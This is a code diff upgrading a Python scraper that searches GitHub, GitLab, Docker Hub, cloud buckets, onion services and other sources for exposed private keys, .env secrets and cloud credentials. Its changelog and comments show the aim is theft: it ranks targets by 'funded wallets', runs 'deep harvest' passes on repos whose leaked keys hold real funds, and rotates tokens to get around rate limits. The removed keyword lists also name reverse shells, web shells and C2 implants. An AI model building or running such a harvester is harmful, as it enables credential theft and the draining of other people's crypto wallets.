@@ -1,10 +1,29 @@
 #!/usr/bin/env python3
 """
-7000.py v3.0 — Multi-engine secret-surface discovery scraper
+7000.py v4.0 — Multi-engine secret-surface discovery scraper
 Searches GitHub, GitLab, HuggingFace, Docker Hub, Bitbucket, Postman,
 and cloud storage (GCS, S3, Azure Blob, DigitalOcean Spaces)
 for repos/projects/buckets likely to contain secrets, keys, credentials,
 and crypto material. Outputs to paste_box.txt for downstream scanning.
+
+v4.0 improvements:
+  • Keyword yield tracking — top-25 report at end of each run
+  • --boost flag — re-probes repos with funded wallets using deep file queries
+  • --adaptive flag — blends high-weight adaptive queries from success atlas
+  • --format targets — writes directly to targets/ directory for pipeline feeding
+  • --two-pass — discovery + deep harvest against funded repos
+  • Keywords rewritten from success-atlas signal (2,448 funded hits analyzed)
+
+
+v5.0 upgrades (Aug 2026):
+  • Atlas-First Engine Selection — rank engines by funded_hits/total_scans yield
+  • Living Dedup with TTL — ffod.jsonl replaces flat ffod.txt, 14-day expiry
+  • Signal-Path Surgical Targeting — atlas top_filenames/signal_paths → precise queries
+  • Token Lifecycle Manager — health scoring, auto-rotation, unauthenticated fallback
+  • Cloud Bucket Genome from Atlas — bucket names generated from proven signal patterns
+  • Default Two-Pass Deep Harvest — discovery + deep file-level surgical strike
+  • Closed-Loop Target Scoring — scan outcomes update .target_scores.json + .hot_targets.json
+  • Onion/Clearnet Correlation — first-class parallel engine via Tor SOCKS proxy
 
 Major improvements in v3.0:
   • Engines run in parallel via ThreadPoolExecutor (4-6x faster)
@@ -56,8 +75,11 @@ import urllib.error
 import urllib.parse
 import urllib.request
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
 from typing import Dict, List, Optional, Set, Any, Tuple
+from dataclasses import dataclass, field
+from pathlib import Path
+import socket
 
 # ── Paths ───────────────────────────────────────────────────────
 HOME = os.path.dirname(os.path.abspath(__file__))
@@ -161,297 +183,145 @@ class ResourceThrottle:
 # =============================================================================
 # COMPREHENSIVE SEARCH TOPICS  (300+ diversified low-overlap terms, tiered)
 # =============================================================================
-# Design principles:
-#   1. One canonical keyword per concept — no synonym clusters
-#   2. Favor specific technical terms over generic single-words
-#   3. Each keyword should surface a *different* repo set, not remix the same top hits
-#   4. Drop saturated broad terms ("bitcoin","aws") — they only return already-seen repos
+# v4.0 rewrite — keywords driven by success-atlas signal (2,448 funded hits):
+#   • 97% EVM — bias Ethereum/EVM hard
+#   • Test fixtures = goldmine (web3-eth-accounts/test/fixtures/ is #1 path)
+#   • .env PRIVATE_KEY is the single best query (weight 1.0 in adaptive)
+#   • registry / testsv2 / morpho / aave / lido dominate funded path parts
+#   • JSON + TS config/fixture files, not library source code
+#   • "Small orgs with .env beat megarepos"
+#   • Drop generic crypto-lib terms — they return repos with NO key material
 # =============================================================================
 
 CRYPTO_TOPICS: List[str] = [
-    # ── Wallet / Key Material (consolidated, one term per concept) ─
-    "wallet.dat backup", "keystore-file", "keystore json",
-    "seed-phrase recovery", "mnemonic-code generator",
-    "bip39 wordlist", "bip32 derivation",
-    "xprv extended key", "xpub derivation",
-    "private-key pem", "BEGIN EC PRIVATE KEY",
-    "solana-keypair json", "ethereum keystore v3",
-    "secret-key env", "secret-keys rotation",
+    # ── TIER 1 — Proven signal paths (success atlas) ──
+    "web3-eth-accounts test fixtures",
+    "eip1559txs test vector",
+    "eip2930txs test fixture",
+    "web3-eth test fixtures erc20",
+    "web3-eth-contract test unit",
+    "deploy_erc20 script",
+    "morpho testsv2 config",
 
-    # ── Crypto Libraries (unique lib names, no generic wrappers) ──
-    "secp256k1 curve", "ed25519 verify", "curve25519 scalar",
-    "libsodium sealed", "nacl secretbox",
-    "boringssl fips", "openssl evp",
-    "pycryptodome rsa", "cryptography hazmat",
-    "bitcoinlib raw", "coincurve ecdsa",
-    "ecdsa recovery", "eddsa batch",
-    "schnorr signature", "musig2 aggregate",
-    "frost threshold", "threshold-signature mpc",
-    "eth-account sign", "eth-keys generate",
-    "web3py contract", "ethers-js provider",
-    "anchor-framework idl", "solana-program library",
-    "openzeppelin contracts", "foundry forge test",
+    # ── TIER 2 — .env / PRIVATE_KEY (weight 1.0 adaptive) ──
+    "PRIVATE_KEY env example",
+    "ETH_PRIVATE_KEY env",
+    "MNEMONIC env wallet",
+    "WALLET_PRIVATE env",
+    "secrets json privateKey",
+    "hardhat config PRIVATE_KEY",
+    "foundry deploy private key",
 
-    # ── Encoding / Hashing (one per algorithm) ────────────────────
-    "base58check encode", "bech32 address",
-    "rlp encode decode", "eth-abi encode",
-    "keccak256 hash", "blake2b keyed",
-    "ripemd160 hash", "scrypt kdf",
-    "argon2 password",
+    # ── TIER 3 — DeFi deploy configs (test wallets → real funds) ──
+    "aave deploy script private",
+    "lido deployment config",
+    "uniswap deploy script",
+    "chainlink deploy config",
+    "safe multisig deploy config",
+    "morpho blue deploy",
+    "eigenlayer deploy config",
+    "pendle deploy script",
+    "etherfi deploy script",
 
-    # ── Secret Managers / Vaults ──────────────────────────────────
-    "hashicorp vault seal", "vault transit engine",
-    "aws secrets manager rotation", "gcp secret manager access",
-    "azure keyvault sdk", "doppler secrets sync",
-    "infisical inject", "sops age encryption",
+    # ── TIER 4 — Fixture files that ship keys ──
+    "account ts test fixtures",
+    "wallet ts test fixtures",
+    "eip712 typed data test json",
+    "eip712 receiveWithAuthorization test",
+    "token json test fixture",
+    "rpc method wrappers fixtures",
 
-    # ── DeFi / Smart Contract Security ────────────────────────────
-    "reentrancy guard", "flash-loan exploit",
-    "frontrun sandwich", "mev bundle",
-    "oracle manipulation price", "rugpull detector",
-    "honeypot token scanner", "wallet-drainer signature",
-    "ice-phishing approval", "permit phishing signature",
-    "proxy upgrade vulnerability", "delegatecall exploit",
-    "selfdestruct opcode", "unchecked return value",
+    # ── TIER 5 — L2 deploy configs (chains with actual hits) ──
+    "arbitrum deploy config l2",
+    "optimism deploy config l2",
+    "base deploy config l2",
+    "polygon zkEVM deploy",
 
-    # ── Blockchain Tooling ────────────────────────────────────────
-    "etherscan api key", "block explorer indexer",
-    "raw-transaction decode", "signed-tx broadcast",
-    "metamask snaps", "phantom wallet adapter",
-    "ledger application", "trezor firmware",
-    "safe multisig transaction", "gnosis-safe sdk",
-    "subgraph index", "covalent api", "moralis stream",
+    # ── TIER 6 — Registry / keystore configs ──
+    "registry config deployment json",
+    "keystore json v3 wallet",
+    "solana keypair json array",
+    "ethereum keystore file",
+    "geth keystore directory",
 
-    # ── Specialized Crypto ────────────────────────────────────────
-    "monero ring signature", "zcash sapling",
-    "grin mimblewimble", "dash masternode",
-    "cosmos ibc", "polkadot substrate",
-    "near protocol account", "aptos move module",
-    "sui move smart", "sei cosmwasm",
-    "erc20 token standard", "erc721 nft metadata",
-    "erc4337 account abstraction", "eip712 typed data",
-    "layer2 bridge contract", "rollup sequencer",
-    "zero-knowledge proof circuit", "zk snark groth16",
-    "lightning network invoice", "taproot script path",
+    # ── TIER 7 — Non-EVM with actual hits (SOL 356, BTC 108) ──
+    "solana program test validator",
+    "solana deploy script keypair",
+    "bitcoin regtest private key",
+    "bitcoin testnet wallet seed",
 ]
 
 INFRA_TOPICS: List[str] = [
-    # ── Environment / Config (selective, no .env overload) ────────
-    ".env production vault", ".env template example",
-    "dotenv flow vault", "env-vars injection",
-    "credentials json service", "service-account private-key",
-    "aws credentials profile", "gcp credentials json",
+    # ── CI/CD env leaks ──
+    "github actions secret env variable",
+    "github workflow env deploy",
+    "gitlab ci variables env",
+    "jenkins credential env config",
 
-    # ── API Keys / Secrets ────────────────────────────────────────
-    "api-key rotation", "api-secret management",
-    "aws access key id secret", "aws session token sts",
-    "infura project secret", "alchemy api key auth",
-    "stripe secret key test", "stripe webhook signing",
-    "twilio auth token sms", "sendgrid api key mail",
-    "github token fine grained", "gitlab personal access token",
-    "slack webhook url secret", "discord webhook token",
-    "telegram bot token api", "openai api key organization",
-    "anthropic api key claude", "huggingface access token",
-    "google api key oauth", "firebase service account",
+    # ── Docker / K8s with exposed env ──
+    "docker compose env file deploy",
+    "Dockerfile env private key",
+    "kubeconfig cluster user token",
+    "k8s secret opaque data",
+    "helm values secrets config",
 
-    # ── IaC (one per tool) ────────────────────────────────────────
-    "terraform state encryption", "terraform sensitive variable",
-    "pulumi secret provider", "pulumi stack config",
-    "cloudformation template parameters", "bicep param secure",
-    "cdk context json", "crossplane composition",
+    # ── IaC secrets ──
+    "terraform state encryption key",
+    "terraform tfvars private key",
+    "pulumi secret provider config",
 
-    # ── Kubernetes ────────────────────────────────────────────────
-    "kubeconfig cluster user", "k8s secret opaque",
-    "kubernetes secret tls", "helm values secrets",
-    "sealed-secrets controller", "external-secrets operator",
-    "configmap literal", "kustomize secret generator",
-    "istio service mesh", "linkerd proxy inject",
+    # ── SSH / SSL / PKI ──
+    "ssh private key pem config",
+    "ssl certificate private key config",
+    "wireguard private key config",
 
-    # ── Docker / Containers ───────────────────────────────────────
-    "docker compose env file", "docker secret create",
-    "docker build arg secret", "Dockerfile arg env",
-    "container registry credential", "ecr get login",
-    "ghcr docker login", "dockerhub access token",
-
-    # ── CI / CD ───────────────────────────────────────────────────
-    "github actions secret context", "github workflow environment",
-    "gitlab ci variables masked", "jenkins credential binding",
-    "circleci context environment", "argocd vault plugin",
-    "fluxcd sops decryption", "tekton pipeline secret",
-    "drone ci secrets", "buildkite agent hook",
-
-    # ── Configuration Management ──────────────────────────────────
-    "ansible vault encrypt string", "ansible lookup hashi vault",
-    "group_vars vault encrypted", "host_vars secrets",
-    "puppet hiera eyaml", "chef data bag secret",
-    "salt pillar gpg renderer", "nixops secret key",
-
-    # ── Database Credentials ──────────────────────────────────────
-    "mongodb connection uri atlas", "redis auth requirepass",
-    "postgresql pgpass connection", "mysql my cnf password",
-    "sqlite encryption key", "dynamodb access key",
-    "elasticsearch xpack security", "cassandra credentials",
-    "neo4j auth bolt", "influxdb admin token",
-    "database url heroku postgres", "connection string sql server",
-
-    # ── SSH / SSL / Certs / PKI ───────────────────────────────────
-    "ssh private key pem ed25519", "ssh config identity file",
-    "authorized_keys command restrict", "ssl certificate private key pem",
-    "letsencrypt account key", "acme challenge dns",
-    "wireguard private key config", "openvpn tls auth key",
-    "gpg private key export", "pgp secret key armor",
-    "pkcs12 keystore password", "jks truststore password",
-
-    # ── Observability / Monitoring ────────────────────────────────
-    "prometheus alertmanager config", "grafana datasource yaml",
-    "elasticsearch kibana password", "datadog api key app",
-    "newrelic license key", "sentry dsn auth token",
-    "pagerduty integration key", "opsgenie api key",
-    "logstash pipeline config", "fluentd secret parameter",
-    "loki s3 credentials", "tempo backend config",
-
-    # ── IAM / Auth ────────────────────────────────────────────────
-    "aws iam role assume", "gcp service account impersonation",
-    "azure ad service principal secret", "okta api token",
-    "auth0 management api", "keycloak admin password",
-    "oauth2 client secret", "oidc client registration",
-    "saml signing certificate", "ldap bind password",
-    "kerberos keytab file", "freeipa admin password",
-
-    # ── Serverless / Edge ─────────────────────────────────────────
-    "aws lambda environment variables", "gcp cloud function env",
-    "azure function app settings", "cloudflare worker secret",
-    "vercel environment variable", "netlify env build",
-    "deno deploy env", "fly io secrets",
-    "supabase service role key", "firebase functions config",
+    # ── Cloud credentials ──
+    "aws access key id secret config",
+    "gcp service account json key",
+    "azure service principal secret config",
+    "cloudflare api token config",
 ]
 
 GENERAL_TOPICS: List[str] = [
-    # ── Mobile Security ───────────────────────────────────────────
-    "android keystore extraction", "ios keychain dump",
-    "apk decompile smali", "ipa decrypt frida",
-    "android manifest permission", "ios provisioning profile",
-    "mobile application penetration", "react native sensitive",
-    "flutter secure storage", "expo secrets env",
+    # ── Mobile app configs ──
+    "android keystore config",
+    "expo secrets env config",
 
-    # ── Firmware / Embedded / IoT ─────────────────────────────────
-    "firmware extraction binwalk", "uboot environment variables",
-    "device tree blob", "squashfs rootfs password",
-    "iot firmware analysis", "esp32 firmware dump",
-    "arm trusted firmware", "tpm attestation key",
-    "secure boot key enrollment", "uefi variable nvram",
-    "router configuration backup", "openwrt shadow hash",
-    "mikrotik backup password", "cisco config enable secret",
+    # ── Router / firmware (backups have real creds) ──
+    "router configuration backup config",
+    "openwrt config shadow hash",
+    "mikrotik backup config password",
+    "cisco config enable secret",
 
-    # ── Automotive / CAN Bus ──────────────────────────────────────
-    "obd2 can bus", "can bus reverse engineering",
-    "uds diagnostic security", "automotive ecu firmware",
-    "tesla api token", "elm327 obd",
+    # ── OSINT API keys ──
+    "shodan api key config",
+    "censys api secret config",
+    "virustotal api key config",
 
-    # ── OSINT / Recon ─────────────────────────────────────────────
-    "shodan api key", "censys api secret",
-    "zoomeye api token", "fofa api key",
-    "grey noise api", "securitytrails api",
-    "virustotal api key", "urlscan api",
-    "alienvault otx api", "threatcrowd api",
-    "spiderfoot scan", "theharvester email",
-    "amass enum passive", "subfinder config",
-    "httpx probe", "nuclei template critical",
-    "gau get all urls", "wayback machine url",
+    # ── Secret scanner configs (dogfooding) ──
+    "trufflehog config verified",
+    "gitleaks config toml detect",
+    "detect-secrets baseline config",
+    "semgrep secrets rule config",
 
-    # ── Phishing / Social Engineering ─────────────────────────────
-    "evilginx phishlet", "gophish campaign",
-    "modlishka reverse proxy", "muraena phishing",
-    "credential harvester payload", "typosquatting domain",
-    "homograph attack domain", "clone phishing toolkit",
+    # ── Supply chain tokens ──
+    "npm package publish token config",
+    "pypi publish token config",
+    "dockerhub access token config",
 
-    # ── Persistence / C2 / Red Team ───────────────────────────────
-    "sliver c2 implant", "havoc c2 teamserver",
-    "mythic agent apfell", "cobalt strike beacon",
-    "metasploit resource script", "empire stager powershell",
-    "covenant grunt listener", "brute ratel badger",
-    "bloodhound sharphound", "mimikatz sekurlsa",
-    "kerberoast hashcat", "asreproast ticket",
-
-    # ── Exfiltration / Data Theft ─────────────────────────────────
-    "rclone config password", "megatools login",
-    "gdrive service account upload", "dropbox access token upload",
-    "s3 sync exfil", "dns exfiltration tunnel",
-    "icmp tunnel data", "webshell backdoor php",
-    "reverse shell python", "bind shell netcat",
-
-    # ── Forensics / Incident Response ─────────────────────────────
-    "volatility memory plugin", "rekall profile",
-    "plaso log2timeline", "sleuthkit autopsy",
-    "yara rule detection", "sigma rule detection",
-    "velociraptor artifact", "grr rapid response",
-    "osquery fleet config", "wazuh agent ossec",
-
-    # ── Vulnerabilities / Exploits ────────────────────────────────
-    "exploitdb searchsploit", "metasploit module exploit",
-    "cve poc exploit", "nvd cpe match",
-    "github advisory", "snyk vulnerability database",
-    "owasp zap context", "burp suite extension",
-    "sqlmap tamper script", "nmap nse script",
-
-    # ── Malware / Reverse Engineering ─────────────────────────────
-    "malware sandbox cape", "cuckoo sandbox analysis",
-    "ghidra script python", "ida pro plugin python",
-    "radare2 r2pipe", "binary ninja plugin",
-    "x64dbg plugin", "ollydbg script",
-    "pe studio analysis", "dnspy decompiler",
-    "jadx decompile apk", "apktool decode",
-    "dex2jar convert", "procyon decompiler",
-
-    # ── Scanner / Pipeline Tools ──────────────────────────────────
-    "trufflehog verified", "gitleaks detect config",
-    "gitguardian ggshield", "detect-secrets baseline",
-    "whispers config", "credential digger",
-    "semgrep rule secrets", "checkov skip check",
-    "tfsec ignore", "trivy scan image",
-    "dependency check nvd", "npm audit fix",
-    "pip audit vulnerability", "bundler audit gem",
-    "cargo audit advisory", "govulncheck module",
-
-    # ── Supply Chain / Build ──────────────────────────────────────
-    "software bill of materials spdx", "cyclonedx sbom",
-    "sigstore cosign sign", "slsa provenance attestation",
-    "in-toto layout", "salsa supply chain",
-    "dependency confusion attack", "package hijack npm",
-    "typosquatting pypi", "malicious docker image",
-    "artifact repository jfrog", "sonatype nexus repository",
+    # ── DeFi exploit PoCs (test wallets) ──
+    "defi hack poc exploit contract",
+    "flash loan attack contract test",
+    "reentrancy attack solidity test",
 ]
 DARKWEB_TOPICS: List[str] = [
-    # ── Onion Service Deployment / Keys ───────────────────────────
+    # ── Onion service deployment / keys ──
     "tor hidden service private key", "onion service v3 address",
     "torrc hidden service dir", "onionbalance config instance",
-    "stem controller onion service", "onion service nginx proxy",
-    "onion-service docker compose tor", "onionshare web server config",
+    "onion-service docker compose tor",
 
-    # ── Darknet Market Infrastructure ──────────────────────────────
-    "darknet market escrow multisig", "marketplace pgp verification",
-    "bitcoin tumbler mixer service", "monero darknet payment gateway",
-    "darknet forum database schema", "vendor pgp key management",
-
-    # ── Tor Relays / Bridges / Anti-censorship ─────────────────────
+    # ── Tor relays / anti-censorship ──
     "tor relay operator configuration", "obfs4 bridge server torrc",
-    "snowflake proxy standalone", "meek transport bridge tor",
-    "bridgedb distributor config", "conjure station phantom",
-
-    # ── Dark Web Recon / OSINT / Crawling ──────────────────────────
-    "onion crawler scrapy middleware", "tor headless browser selenium",
-    "onion service fingerprint scan", "darknet osint reconnaissance",
-    "onion scan hidden service probe", "tor exit relay bad onion",
-
-    # ── Anonymous Messaging / P2P over Tor ─────────────────────────
-    "ricochet refresh protocol", "briar tor plugin android",
-    "cwtch server binding", "session loki service node",
-    "tox dht bootstrap", "retroshare tor hidden",
-
-    # ── Dark Web Tooling / Frameworks ──────────────────────────────
-    "dnp py darknet python", "tor stem library authenticate",
-    "socks5h tor proxy chain", "privacy badger onion list",
-    "https everywhere onion upgrade", "orjail tor namespaces",
 ]
 
 # Combined list for default mode  (dict.fromkeys removes exact dupes)
@@ -468,7 +338,7 @@ TOPIC_TIERS = {
 }
 
 ALL_ENGINES = ["github", "gitlab", "huggingface", "docker",
-               "gcs", "s3", "azure", "spaces", "bitbucket", "postman"]
+               "gcs", "s3", "azure", "spaces", "bitbucket", "postman", "onion"]
 
 KNOWN_BB_WORKSPACES = [
     # ── Crypto ──────────────────────────────────────────────────
@@ -508,6 +378,48 @@ KNOWN_BB_WORKSPACES = [
     "carlospolop", "orange-tsai",
 ]
 
+# ── Known high-signal GitHub orgs for org-probe ─────────────────
+GITHUB_KNOWN_ORGS = [
+    "ethereum", "bitcoin", "solana-labs", "polkadot", "cosmos",
+    "near", "aptos-labs", "sui", "monero-project", "zcash",
+    "openzeppelin", "foundry-rs", "web3", "web3j", "ethers-io",
+    "metamask", "trustwallet", "safe-global", "ledgerhq", "trezor",
+    "aave", "uniswap", "compound-finance", "makerdao", "curvefi",
+    "chainlink", "lido", "1inch", "morpho-org", "pendle-finance",
+    "eigenlayer", "etherfi", "renzo-protocol",
+    "layerzero-labs", "wormhole-foundation",
+    "offchainlabs", "ethereum-optimism", "base-org",
+    "matter-labs", "scroll-tech", "starkware-libs",
+    "googlecloudplatform", "aws-samples", "hashicorp",
+    "trailofbits", "certik", "peckshield",
+    "projectdiscovery", "trufflesecurity", "gitleaks",
+]
+
+# ── Docker Hub darknet queries ──────────────────────────────────
+DOCKER_DARKNET_QUERIES = [
+    "tor hidden", "onion service", "i2p router",
+    "darknet", "privacy proxy", "mixnet",
+]
+
+# ── HuggingFace darknet queries ─────────────────────────────────
+HF_DARKNET_QUERIES = [
+    "onion", "tor hidden", "darknet", "privacy",
+    "anonymous communication", "censorship resistant",
+]
+
+# ── Postman darknet queries ─────────────────────────────────────
+POSTMAN_DARKNET_QUERIES = [
+    "onion", "tor", "darknet", "bitcoin rpc",
+    "monero wallet", "privacy",
+]
+
+# ── Bitbucket darknet workspace probes ──────────────────────────
+DARKNET_ORGS = [
+    "onionshare", "torproject", "privacytools",
+    "darknet-market", "monero-ecosystem",
+    "zcashexplorer", "wasabiwallet",
+]
+
 
 # =============================================================================
 # TOKEN LOADING
@@ -521,6 +433,8 @@ def load_env_tokens() -> Dict[str, Any]:
         "bitbucket_user": "",
         "bitbucket_pass": "",
         "bitbucket_api_token": "",
+        "docker_user": "",
+        "docker_token": "",
         "postman_key": "",
     }
     if not os.path.exists(ENV_FILE):
@@ -568,6 +482,16 @@ def load_env_tokens() -> Dict[str, Any]:
                 if m:
                     tokens["postman_key"] = m.group(1).strip().strip('"').strip("'")
                     continue
+                # Docker Hub
+                m = re.match(r'^\s*DOCKER_HUB_USERNAME\s*=\s*([^#]+)', line)
+                if m:
+                    tokens["docker_user"] = m.group(1).strip()
+                    continue
+                m = re.match(r'^\s*DOCKER_HUB_TOKEN\s*=\s*(.+)$', line)
+                if m:
+                    tok = m.group(1).strip().strip('"').strip("'")
+                    tokens["docker_token"] = tok
+                    continue
     except Exception:
         pass
 
@@ -611,7 +535,13 @@ def http_request(
             if v:
                 req.add_header(k, v)
 
-    for attempt in range(4):
+    # Determine max retries: 4 for auth'd requests, only 2 for anonymous
+    has_auth = bool(headers and any(
+        v for k, v in headers.items()
+        if k.lower() in ("authorization", "x-api-key", "private-token")))
+    max_attempts = 4 if has_auth else 2
+
+    for attempt in range(max_attempts):
         try:
             with urllib.request.urlopen(req, timeout=timeout, context=SSL_CONTEXT) as resp:
                 # Check rate-limit headers for informational logging
@@ -629,7 +559,7 @@ def http_request(
         except urllib.error.HTTPError as e:
             body = e.read().decode("utf-8", errors="replace") if e.fp else ""
 
-            # Rate-limited — extract backoff from headers
+            # Rate-limited -- extract backoff from headers
             if e.code in (403, 429):
                 retry_after = e.headers.get("Retry-After")
                 reset_epoch = e.headers.get("X-RateLimit-Reset")
@@ -648,7 +578,14 @@ def http_request(
                 else:
                     wait_s = jittered_backoff(attempt, base_ms=3000)
 
-                cprint(f"   ⚠ HTTP {e.code} rate-limited — sleeping {wait_s:.0f}s (attempt {attempt+1}/4)",
+                # For anonymous 403: if wait > 120s, skip retrying entirely
+                if not has_auth and e.code == 403 and wait_s > 120:
+                    cprint(f"   ⚠ HTTP 403 (anonymous, wait {wait_s:.0f}s) -- giving up",
+                           color=C_YELLOW)
+                    return {"_error": "rate-limited (anonymous 403)", "_code": 403}
+
+                cprint(f"   ⚠ HTTP {e.code} rate-limited -- sleeping {wait_s:.0f}s "
+                       f"(attempt {attempt+1}/{max_attempts})",
                        color=C_YELLOW)
                 if token_rotator and hasattr(token_rotator, 'mark_token_ratelimited'):
                     token_rotator.mark_token_ratelimited(wait_s)
@@ -740,11 +677,16 @@ class TokenRotator:
             wait = max(1, soonest - now)
             cprint(f"[{self._platform}] all tokens exhausted, waiting {wait:.0f}s...",
                    color=C_YELLOW, dim=True)
-            time.sleep(wait)
+            self._lock.release()
+            try:
+                time.sleep(wait)
+            finally:
+                self._lock.acquire()
             # Reset all
+            now = time.time()
             for t in self._tokens:
                 self._remain[t] = self._calls_per_hour
-                self._reset[t] = time.time() + self._cooldown_secs
+                self._reset[t] = now + self._cooldown_secs
             return self._tokens[0] if self._tokens else None
 
     def mark_token_ratelimited(self, cooldown_secs: float = 3600):
@@ -779,7 +721,7 @@ class OutputWriter:
 
     def __init__(self, output_path: str, food_path: str,
                  fresh: bool = False, no_dedup: bool = False,
-                 jsonl: bool = False, resume: bool = False,
+                 jsonl: bool = False, resume: bool = False, targets_fmt: bool = False,
                  skip_probes: bool = False):
         self.output_path = output_path
         self.food_path = food_path
@@ -789,12 +731,21 @@ class OutputWriter:
         self._lock = threading.Lock()
         self._food_seen: Set[str] = set()
         self._repo_ids_seen: Set[str] = set()  # "source:owner/repo" normalized
+        # v5.0: TTL-based dedup store
+        self._ttl_store: dict[str, dict] = {}
+        self._ttl_seconds: int = 14 * 86400  # default 14 days (overridden by --dedup-ttl)
+        self._ttl_enabled: bool = True
+        self._ffod_jsonl = food_path.replace(".txt", ".jsonl") if food_path.endswith(".txt") else food_path + ".jsonl"
+        self._load_ttl_store()
+        self._migrate_ffod_if_needed()
         self.total_written = 0
         self.total_skipped = 0
         self.total_duplicate_repos = 0  # same repo, different keyword
         self.total_seen = 0
         self.engine_counts: Dict[str, int] = {}
         self._resume_loaded = 0
+        self.keyword_yield: Dict[str, int] = {}  # keyword → repos discovered
+        self._targets_fmt = targets_fmt
 
         # Determine open mode
         if fresh:
@@ -803,7 +754,10 @@ class OutputWriter:
             mode = "a"
             cprint(f"[init] Found resume file {RESUME_TMP}, loading...", color=C_CYAN)
             self._load_resume()
+        elif targets_fmt:
+            mode = "a"  # targets mode always appends
         else:
+            # In targets mode, always append (multiple engines write to same files)
             mode = "a" if os.path.exists(output_path) else "w"
 
         # Open output file
@@ -895,15 +849,15 @@ class OutputWriter:
                 self._repo_ids_seen.add(repo_id)
             self._food_seen.add(line)
 
-            # Write output line (fsync for durability on Android/Termux)
+            # Write output line (deferred fsync outside lock)
+            write_ok = True
             try:
                 if self._fh is not None:
                     self._fh.write(line + "\n")
                     self._fh.flush()
-                    os.fsync(self._fh.fileno())
             except Exception as e:
                 cprint(f"[!] Failed to write line: {e}", color=C_BRED)
-                return False
+                write_ok = False
 
             # Write food line
             if not self.no_dedup:
@@ -913,10 +867,22 @@ class OutputWriter:
                 except Exception:
                     pass
 
-            self.total_written += 1
-            self.engine_counts[source] = self.engine_counts.get(source, 0) + 1
+            # ── Keyword yield tracking ───────────────────────────
+            self.keyword_yield[topic] = self.keyword_yield.get(topic, 0) + 1
 
-        return True
+            if write_ok:
+                self.total_written += 1
+                self.engine_counts[source] = self.engine_counts.get(source, 0) + 1
+
+        # fsync outside the lock to avoid deadlock
+        if write_ok:
+            try:
+                if self._fh is not None:
+                    os.fsync(self._fh.fileno())
+            except Exception:
+                pass
+
+        return write_ok
 
     def flush(self) -> int:
         written = self.total_written
@@ -935,12 +901,434 @@ class OutputWriter:
                 pass
         return written
 
+    # ── v5.0: TTL dedup methods ─────────────────────────────────────
+
+    def _load_ttl_store(self):
+        """Load TTL dedup store from ffod.jsonl."""
+        if not os.path.exists(self._ffod_jsonl):
+            return
+        try:
+            with open(self._ffod_jsonl, "r") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        rec = json.loads(line)
+                        uri = rec.get("uri", "")
+                        if uri:
+                            self._ttl_store[uri] = rec
+                            self._food_seen.add(uri)
+                    except json.JSONDecodeError:
+                        continue
+        except Exception:
+            pass
+
+    def _migrate_ffod_if_needed(self):
+        """Migrate old flat ffod.txt to ffod.jsonl on first v5.0 run."""
+        if self._ttl_store:
+            return  # Already migrated
+        if not os.path.exists(self.food_path):
+            return
+        # Only migrate if it's the old flat format
+        try:
+            count = 0
+            with open(self.food_path, "r") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    if not line.startswith("{"):
+                        # Old format — needs migration
+                        now = datetime.now(timezone.utc).isoformat()
+                        self._ttl_store[line] = {"uri": line, "first_seen": now,
+                                                  "last_seen": now, "scan_count": 1,
+                                                  "last_scanned_at": now}
+                        self._food_seen.add(line)
+                        count += 1
+            if count > 0:
+                self._flush_ttl_store()
+                cprint(f"[init] Migrated {count} entries from ffod.txt → ffod.jsonl (TTL enabled)", color=C_CYAN)
+        except Exception:
+            pass
+
+    def _flush_ttl_store(self):
+        """Write TTL store to ffod.jsonl."""
+        try:
+            with open(self._ffod_jsonl, "w") as f:
+                for uri, rec in self._ttl_store.items():
+                    f.write(json.dumps(rec) + "\n")
+        except Exception:
+            pass
+
+    def is_expired(self, uri: str) -> bool:
+        """Check if a URI's TTL has expired and it can be re-scanned."""
+        if not self._ttl_enabled or uri not in self._ttl_store:
+            return True  # Not in store = eligible
+        rec = self._ttl_store[uri]
+        last = rec.get("last_scanned_at", rec.get("first_seen", ""))
+        if not last:
+            return True
+        try:
+            last_dt = datetime.fromisoformat(last.replace("Z", "+00:00"))
+            age = (datetime.now(timezone.utc) - last_dt).total_seconds()
+            return age > self._ttl_seconds
+        except Exception:
+            return True
+
+    def touch_uri(self, uri: str):
+        """Update last_seen for a URI in the TTL store."""
+        now = datetime.now(timezone.utc).isoformat()
+        if uri in self._ttl_store:
+            self._ttl_store[uri]["last_seen"] = now
+            self._ttl_store[uri]["scan_count"] = self._ttl_store[uri].get("scan_count", 0) + 1
+            self._ttl_store[uri]["last_scanned_at"] = now
+        else:
+            self._ttl_store[uri] = {"uri": uri, "first_seen": now, "last_seen": now,
+                                     "scan_count": 1, "last_scanned_at": now}
+
+    def reap_stale(self, max_age_days: int = 90):
+        """Remove entries older than max_age_days from TTL store."""
+        cutoff = (datetime.now(timezone.utc) - timedelta(days=max_age_days)).isoformat()
+        stale = [u for u, r in self._ttl_store.items()
+                 if r.get("last_scanned_at", r.get("first_seen", "")) < cutoff]
+        for u in stale:
+            del self._ttl_store[u]
+            self._food_seen.discard(u)
+        if stale:
+            self._flush_ttl_store()
+            cprint(f"[reap] Removed {len(stale)} stale entries (> {max_age_days} days)", color=C_CYAN)
+
     def close(self):
         try:
             if self._fh is not None:
                 self._fh.close()
         except Exception:
             pass
+
+
+
+# =============================================================================
+# v5.0: ATLAS-DRIVEN INTELLIGENCE
+# =============================================================================
+
+def load_target_scores() -> dict:
+    """Load .target_scores.json, return empty dict if missing."""
+    path = os.path.join(HOME, ".target_scores.json")
+    if not os.path.exists(path):
+        return {}
+    try:
+        with open(path, "r") as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+
+def save_target_scores(scores: dict) -> None:
+    """Save .target_scores.json atomically."""
+    path = os.path.join(HOME, ".target_scores.json")
+    try:
+        with open(path, "w") as f:
+            json.dump(scores, f, indent=2)
+    except Exception as e:
+        cprint(f"[!] Failed to save target scores: {e}", color=C_RED)
+
+
+def rank_engines_by_yield() -> list[tuple[str, float, int, int]]:
+    """Rank engines by funded_hits / total_scans from .scan_outcomes.jsonl.
+
+    Returns [(engine_name, yield_ratio, funded_hits, total_scans), ...] sorted by yield desc.
+    """
+    outcomes_path = os.path.join(HOME, ".scan_outcomes.jsonl")
+    if not os.path.exists(outcomes_path):
+        return []
+
+    engine_stats: dict[str, dict[str, int]] = {}
+    try:
+        with open(outcomes_path, "r") as f:
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    rec = json.loads(line)
+                except json.JSONDecodeError:
+                    continue
